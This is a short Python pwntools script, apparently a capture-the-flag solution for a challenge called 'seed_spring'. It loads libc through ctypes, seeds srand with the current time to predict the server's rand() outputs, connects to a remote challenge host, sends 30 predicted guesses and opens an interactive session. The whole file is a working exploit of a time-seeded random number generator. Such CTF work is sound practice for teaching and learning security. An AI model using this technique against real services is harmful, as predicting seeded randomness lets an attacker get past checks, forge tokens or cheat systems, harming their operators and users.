#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL


def get_rands(i):
    c = CDLL("/lib/x86_64-linux-gnu/libc-2.27.so")

    rands = []

    t = c.time(0)
    c.srand(t + i)

    for i in range(0, 30):
        rands.append(c.rand() & 0xf)

    return rands

# r = process("./seed_spring")
r = remote("jh2i.com", 50010)

rands = get_rands(0)
for item in rands:
    r.recvuntil("Guess the height: ")
    r.sendline(str(item))

r.interactive()
